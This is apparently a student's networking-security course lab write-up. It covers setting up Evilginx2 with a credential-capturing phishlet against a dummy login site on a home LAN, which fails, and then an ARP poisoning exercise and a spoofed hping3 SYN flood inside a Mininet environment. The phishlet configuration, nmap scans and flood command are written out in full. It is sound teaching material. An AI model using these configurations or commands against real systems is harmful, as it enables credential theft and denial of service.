# Lab and simulation environments in attacks

# A) Tools
Familiarize yourself with the tool: **Evilginx** <https://github.com/kgretzky/evilginx2>     
Answer the following questions:
- Did you install the tool, and how did you do it?
- What did you do with the tool?
- Were you succesfull in spoofing traffic?

### Walkthrough
I installed the tool on my Kali-VM (the VM uses a bridged adapter, so that I can test it out in my own LAN).      

Install using:
```
$ sudo apt install evilginx2
```
- <img width="790" height="339" alt="Screenshot from 2025-11-23 22-54-42" src="https://github.com/user-attachments/assets/fd806af2-a535-4322-a8e5-c0b70777d464" />     

Launch by typing:
```
$ evilginx2
```
- <img width="994" height="612" alt="Screenshot from 2025-11-24 10-06-50" src="https://github.com/user-attachments/assets/ff14f7b3-09a2-4c9e-a96b-4fce0c6d1c90" />     
 
Set up domain and IP (i'm trying this out in my local network)
```
: config domain safe-domain
```
```
: config ipv4 external <ip-of-my-vm-running-evilginx>
```
 - <img width="905" height="146" alt="Screenshot from 2025-11-24 10-25-51" src="https://github.com/user-attachments/assets/da088d8e-538b-44b7-9d0d-2050c77c433a" />

Because i'm doing this in my own LAN, a simple config of `/etc/hosts` on the "victim" will do the trick. 
- <img width="480" height="246" alt="Screenshot from 2025-11-24 18-32-38" src="https://github.com/user-attachments/assets/aa2d44ab-002a-43d9-afa8-7d951aab4d16" />
- <img width="793" height="233" alt="Screenshot from 2025-11-24 22-19-05" src="https://github.com/user-attachments/assets/7008c467-8fbc-43a4-9031-109dca3ed735" />


I asked chatGPT to make me a dummy login site which I can use for in my own LAN. I had it create me a python flask app I can use for testing purposes.
### The dummy site works:
- <img width="1036" height="149" alt="Screenshot from 2025-11-24 22-04-44" src="https://github.com/user-attachments/assets/94dc1900-f76e-423b-a1a9-352ba2f436f3" />
- <img width="1226" height="421" alt="Screenshot from 2025-11-24 18-48-13" src="https://github.com/user-attachments/assets/091aa1d0-f20f-439a-94ab-5a92651047a5" />

## But does attack work?
I had so many problems getting evilginx to work with my ssl snakeoil certs
- <img width="1184" height="509" alt="Screenshot from 2025-11-24 18-51-32" src="https://github.com/user-attachments/assets/2255015f-e149-4e9c-b64e-358edd7a57c5" />
- So I tried to disable TLS.     

This is the setup I went with:
```bash
$ cat /usr/share/evilginx2/phishlets/dummy.yaml
```
**File:** `dummy.yaml`
```yaml
name: 'dummy'
author: 'aliG'
min_ver: '3.0.0'

proxy_hosts:
  - phish_sub: 'login'
    orig_sub: ''
    domain: 'safe-domain.com'
    session: true
    is_landing: true
    auto_filter: true

sub_filters:
  - phish_sub: 'login'
    orig_sub: ''
    triggers_on: 'login'
    domain: 'safe-domain.com'
    mimes: ['text/html', 'application/json', 'text/plain']
    search: 'safe-domain.com'
    replace: 'login.safe-domain.com'

auth_tokens:
  - name: 'sessionid'
    domain: 'safe-domain.com'
    path: '/'
    keys: ['sessionid']

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'safe-domain.com'
  path: '/login'

disable_tls: true
```

**File:** `~/.evilginx/config.json`
```json
{
  "blacklist": {
    "mode": "unauth"
  },
  "general": {
    "autocert": false,
    "bind_ipv4": "192.168.1.123",
    "dns_port": 53,
    "domain": "safe-domain.com",
    "external_ipv4": "192.168.1.123",
    "https_port": 443,
    "ipv4": "192.168.1.123",
    "redirect_http": false,
    "redirect_https": false,
    "ssl": false
  },
  "unauth_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
  "gophish": {
    "admin_url": "",
    "api_key": "",
    "insecure": false
  },
  "phishlets": {
    "dummy": {
      "hostname": "safe-domain.com",
      "unauth_url": "",
      "enabled": true,
      "visible": true
    },
    "example": {
      "hostname": "",
      "unauth_url": "",
      "enabled": false,
      "visible": true
    }
  }
}       
```
## Execution:
- <img width="758" height="368" alt="Screenshot from 2025-11-24 22-15-52" src="https://github.com/user-attachments/assets/cb6395aa-078b-46b2-b3a3-5c1ff66980af" />
- But no, keeps timing out...
  - <img width="1129" height="651" alt="Screenshot from 2025-11-24 22-18-27" src="https://github.com/user-attachments/assets/0bebf411-e434-42af-815e-c918c9dd29e7" />

### Conclusion:
- This task was a fail for me, I will try to get it to work later.
- But it is what it is, we live and we learn!
- I guess you can't run this without TLS. So have to just figure it out.



**Sources:**
- <https://www.kali.org/tools/evilginx2/>
- <https://cilynx.com/how-to/evilginx2-vs-2fa-phishing/1908/>
- <https://github.com/kgretzky/evilginx2/wiki/FAQ>
- ChatGPT, Prompt: "Create me a dummy app I can use for testing evilginx"       
   



# B) Mininet. Create an environment, where you can do a TCP SYN-flood attack. Report on how you created the environment and executed the attack
Setting it up:
- Download image
  - Link provided by teacher
  - You can download it from here: <https://mininet.org/download/>
- Import it to VBox
  - <img width="954" height="573" alt="Screenshot from 2025-11-24 22-45-12" src="https://github.com/user-attachments/assets/6b6e8fc6-ca7f-415a-965b-167e68469712" />
- Create host-only adapter
  - <img width="591" height="174" alt="Screenshot from 2025-12-01 20-44-43" src="https://github.com/user-attachments/assets/a6bd3c0b-f52d-4654-90b7-8f7627773421" />
- Attach to VM as the second adapter (first one is NAT)
  - <img width="639" height="168" alt="Screenshot from 2025-12-01 20-45-19" src="https://github.com/user-attachments/assets/95016eae-c82a-4e83-adb5-f051ddfdb496" />
- Start machine
- First order of business: `sudo loadkeys fi`
- Get the IP address of the eth0 interface:
  - <img width="792" height="68" alt="Screenshot from 2025-12-01 21-35-55" src="https://github.com/user-attachments/assets/dd2e8586-dd04-4d39-8f67-1fa9e36c0e9c" />    

Now that the key map is all proper and nice, and we have the IP, we can get down to actual business.
```
ryu-manager ryu.app.simple_switch_13
```
This effectively starts the controller.    
<img width="642" height="113" alt="image" src="https://github.com/user-attachments/assets/d8c8ea8a-e6e5-49c0-ab7f-de9ad0efd689" />

### Ryu?
- A quick "google search" (the AI summary at the top of the page) tells us, that `ryu-manager` is used to manage ryu applications, which are really just tools used in SDN (Software Defined Networking).
- Ryu in itself "is a component-based SDN framework"
- Source: <https://ryu-sdn.org/>

Anyway, when the controller is on, we can ssh into the VM && start the environment using the command:
```bash
sudo mn --topo single,3 --mac --switch ovsk --controller remote
```
- <img width="1222" height="441" alt="Screenshot from 2025-12-01 21-41-13" src="https://github.com/user-attachments/assets/924d2244-0d23-47b5-9f24-9e2faef0322c" />    

The command shortly (check mininet walkthrough for more (link in sources)):
- `mn` = MiniNet
- `--topo single,3` = Single topology, 3 hosts
- `--mac` = Tells mininet to use unique, small & easy to read addressing (mac & ip)
- `--switch ovsk` = Switch type: Open vSwitch
- `--controller remote` =
  - This could also be started as `sudo mn --controller,ryu.app.simple_switch_13`    
  - But because we started it already, we are effectively using it as a **remote** controller, and in this command telling mininet to use it.

### Testing connectivity
```
mininet> pingall
```
- <img width="1477" height="219" alt="Screenshot from 2025-12-01 21-46-13" src="https://github.com/user-attachments/assets/9fcd3fe2-05da-44e2-89c0-69d35a30f29a" />     
And we have a working mininet environment up and running.
We can even see the activity from the controller output on the right!

xterm was giving me some problems, so I ran the command provided by the professor Mr. Iso-Anttila
- <img width="1238" height="125" alt="Screenshot from 2025-12-01 21-51-39" src="https://github.com/user-attachments/assets/3700159a-e0e7-434e-a840-f2a14322ebfc" />
- <img width="1060" height="194" alt="image" src="https://github.com/user-attachments/assets/257a2cb8-e4ad-4966-a93d-62de16d89abd" />
- Thank you Lari!

### ARP poisoning
I started off by stretching my legs, but stil using training wheels, meaning I completed the ARP poisoning exercise led by professor Iso-Anttila.     
It was a very interesting exercise.    
We ran a few commands and started the `arp_poison.py` in the background:
- On H3
  - <img width="489" height="201" alt="ARP-poisoning-SSH-honeypot" src="https://github.com/user-attachments/assets/408efeeb-24c9-422b-a89b-de5181ca0d15" />
- Listening in
  - <img width="484" height="120" alt="Screenshot from 2025-12-01 22-02-21" src="https://github.com/user-attachments/assets/d8c3c178-7ab0-4ada-857e-0722a5f49b83" />
  - <img width="522" height="369" alt="Screenshot from 2025-12-01 22-01-15" src="https://github.com/user-attachments/assets/e0c1f346-a12c-4e57-8db7-31269fc8290e" />
- When connecting using SSH to H2 from H1:
  - <img width="522" height="369" alt="Screenshot from 2025-12-01 22-01-15" src="https://github.com/user-attachments/assets/81202498-1212-46f0-a54f-48ec320ed5b8" />
  - Yes we got the warning, which means the ARP poisoning worked.
  - On to flooding the net!


## TCP SYN-Flood attack
> The environment is already up and running. Let's get cracking!     
 
Using node 3 as the attack machine.         
**H1 will work as the victim:**
- <img width="493" height="130" alt="Screenshot from 2025-12-01 23-05-09" src="https://github.com/user-attachments/assets/6584aae1-5f43-410a-b6dd-d61460f6a230" />     

Download nmap and see what we're working with:
```
nmap -sn 10.0.0.0/24
```
<img width="422" height="161" alt="Screenshot from 2025-12-01 22-58-19" src="https://github.com/user-attachments/assets/04b8ba97-9499-4e1d-af49-3c47bc34fd5d" />     

Host 10.0.0.1 is up, let's figure out an entry point:
```
nmap -sS 10.0.0.1
```
<img width="427" height="138" alt="Screenshot from 2025-12-01 23-05-47" src="https://github.com/user-attachments/assets/a6c637d3-1971-4768-a908-f22404beaaf0" />     

Target aquired, time to execute attack.    
Found a script online to use: <https://gist.github.com/ankur8931/df0fde848afa0a8f226e4fcbafc02952>     
Added it to my arsenal:
- <img width="1211" height="135" alt="Screenshot from 2025-12-01 22-25-05" src="https://github.com/user-attachments/assets/343ca38d-1b69-41ab-9cb0-c847c6ff1c5b" />     

Only thing left was to specify which interface plus target to use:
- <img width="283" height="71" alt="Screenshot from 2025-12-01 23-07-22" src="https://github.com/user-attachments/assets/4035b069-e751-489b-9bff-9ea7d0867160" />
- <img width="426" height="31" alt="Screenshot from 2025-12-01 23-29-48" src="https://github.com/user-attachments/assets/aa2614d2-c782-490b-b366-2df3c47968db" />

There was only one problem tho:
- <img width="1122" height="313" alt="Screenshot from 2025-12-01 23-29-08" src="https://github.com/user-attachments/assets/4910c88d-b994-4b5c-bcb4-216676b64ff8" />     

*20,000 packets in 30 seconds*? I must've done something wrong, as this was simply not going to cut it for us.     
So I did some soul searching online, and found a pretty hefty utility called `hping3`     

## HPING3 For The Win!
The man pages came to my aid once again, as I was figuring out this little utility.     
After a few test runs, I finally carved out the big gun. Let me present to you:
```
hping3 -S --spoof 8.8.8.8 --flood -p 80 10.0.0.1
```
**Quick rundown:**
- `-S` = sets tcp SYN flag
- `--spoof <IP>` = well... spoofs an ip address innit
- `--flood` = well... floods the gates innit xd
- `-p 80` port 80 to attack (the one nmap so kindly delivered to us)
- Last portion is the poor host we're going to demolish

This time around, it actually delivered:
<img width="500" height="95" alt="Screenshot from 2025-12-01 23-47-15" src="https://github.com/user-attachments/assets/8ce1da9a-52b3-4168-af14-234464559edb" />     
<img width="1239" height="388" alt="Screenshot from 2025-12-01 23-47-48" src="https://github.com/user-attachments/assets/e6f817b3-788d-46ea-959f-ac647052895e" />     

A whopping **12 million** packets in **8 seconds**.      
hping really delivered, and this mission is accomplished in my books.
At least my controller thought so üòÇ:
- <img width="981" height="44" alt="Screenshot from 2025-12-01 23-45-50" src="https://github.com/user-attachments/assets/3514e0bc-9c02-43fa-9182-932ce60a498a" />

Having completed the lab, time to clean up and say bye bye! üñêÔ∏è
```
sudo mn -c
```
<img width="1244" height="176" alt="Screenshot from 2025-12-01 23-51-17" src="https://github.com/user-attachments/assets/6ea19b39-44d7-440a-943d-aad33702b321" />
<img width="960" height="73" alt="Screenshot from 2025-12-01 23-52-31" src="https://github.com/user-attachments/assets/d20a1c73-9fbe-4970-96e9-3db0b0db0c36" />


# and
```
sudo shutdown now
```



**Sources and reading:**
- Mininet walkthrough
  - <https://mininet.org/walkthrough/>
- Commands
  - <https://www.geeksforgeeks.org/linux-unix/mininet-commands/>
- synflood.py script
  - <https://gist.github.com/ankur8931/df0fde848afa0a8f226e4fcbafc02952>
- Upgrade your workflow by using `screen` (or `tmux`)
  - <https://cheatsheetindex.com/screen-cheat-sheet/>
  - <https://tmuxcheatsheet.com/>
 
